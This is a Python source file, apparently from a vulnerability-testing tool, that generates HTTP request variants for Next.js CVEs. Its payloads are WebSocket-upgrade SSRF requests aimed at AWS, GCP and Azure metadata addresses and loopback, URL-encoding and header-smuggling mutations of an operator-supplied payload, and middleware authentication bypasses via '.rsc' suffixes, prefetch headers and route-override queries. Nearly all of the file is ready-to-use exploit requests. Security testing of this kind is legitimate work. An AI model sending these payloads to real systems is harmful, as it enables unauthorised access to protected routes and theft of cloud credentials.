"""CVE variant generators (part 2): nextjs ws-ssrf / generic / middleware."""

from __future__ import annotations

import json
from typing import Any
from urllib.parse import quote


def _nextjs_ws_ssrf_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Next.js WebSocket Upgrade SSRF — CVE-2026-44578.

    Server-side proxy upgrade fetches the Host without filtering loopback
    or cloud-metadata addresses. Sweep the four canonical metadata Hosts
    plus a Collaborator placeholder.
    """
    variants: list[dict[str, Any]] = []
    # AWS IMDS via WS upgrade
    variants.append({
        "label": "ws_ssrf.aws_imds",
        "method": "GET",
        "headers": {
            "Host": "169.254.169.254",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    # GCP metadata
    variants.append({
        "label": "ws_ssrf.gcp_metadata",
        "method": "GET",
        "headers": {
            "Host": "metadata.google.internal",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Metadata-Flavor": "Google",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    # Azure IMDS
    variants.append({
        "label": "ws_ssrf.azure_imds",
        "method": "GET",
        "headers": {
            "Host": "169.254.169.254",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Metadata": "true",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    # Loopback
    variants.append({
        "label": "ws_ssrf.loopback",
        "method": "GET",
        "headers": {
            "Host": "127.0.0.1",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    # X-Forwarded-Host variant (some proxies trust this)
    variants.append({
        "label": "ws_ssrf.xfh_imds",
        "method": "GET",
        "headers": {
            "X-Forwarded-Host": "169.254.169.254",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    return variants


def _generic_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Fallback when CVE class is unknown: encoding-chain mutations on
    operator-supplied baseline. Hard-bounded by max_variants caller cap."""
    if not baseline:
        return []
    from urllib.parse import quote
    base = baseline.replace("__CANARY__", canary)
    variants = []
    variants.append({"label": "gen.raw", "method": "POST",
                     "headers": {"Content-Type": "application/json"},
                     "body": base})
    variants.append({"label": "gen.url_encoded", "method": "POST",
                     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                     "body": "p=" + quote(base, safe="")})
    variants.append({"label": "gen.double_url_encoded", "method": "POST",
                     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                     "body": "p=" + quote(quote(base, safe=""), safe="")})
    variants.append({"label": "gen.json_string_escaped", "method": "POST",
                     "headers": {"Content-Type": "application/json"},
                     "body": '{"p":' + repr(base) + "}"})
    variants.append({"label": "gen.header_smuggle", "method": "POST",
                     "headers": {"Content-Type": "application/json",
                                 "X-Forwarded-Payload": base[:200]},
                     "body": '{"canary":"' + canary + '"}'})
    return variants


def _nextjs_middleware_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Next.js May-2026 middleware bypass (Vercel-official, Spec D D4).

    CVE-2026-44575: App Router `.rsc` / segment-prefetch URLs reach protected
    content, skipping middleware. CVE-2026-44574: a crafted query param alters
    the dynamic-route value, hiding the path from middleware. `target_url` should
    be the protected route (e.g. https://app/admin). A 200 with RSC content where
    the base route returns 302/403 is the bypass signal — compare vs baseline.
    """
    variants: list[dict[str, Any]] = []
    # CVE-2026-44575: .rsc suffix on the path skips middleware auth.
    variants.append({
        "label": "mw_bypass.rsc_suffix", "method": "GET",
        "url_suffix": ".rsc",
        "headers": {"RSC": "1", "X-Praetor-Canary": canary}, "body": "",
    })
    # CVE-2026-44575: segment-prefetch header form.
    variants.append({
        "label": "mw_bypass.segment_prefetch", "method": "GET",
        "headers": {"Next-Router-Prefetch": "1", "RSC": "1",
                    "Next-Router-State-Tree": "%5B%22%22%5D",
                    "X-Praetor-Canary": canary}, "body": "",
    })
    # CVE-2026-44574: query param alters dynamic route value, hides path from mw.
    variants.append({
        "label": "mw_bypass.query_route_override", "method": "GET",
        "query": f"__nextDataReq=1&_rsc={canary[:8]}",
        "headers": {"X-Praetor-Canary": canary}, "body": "",
    })
    return variants


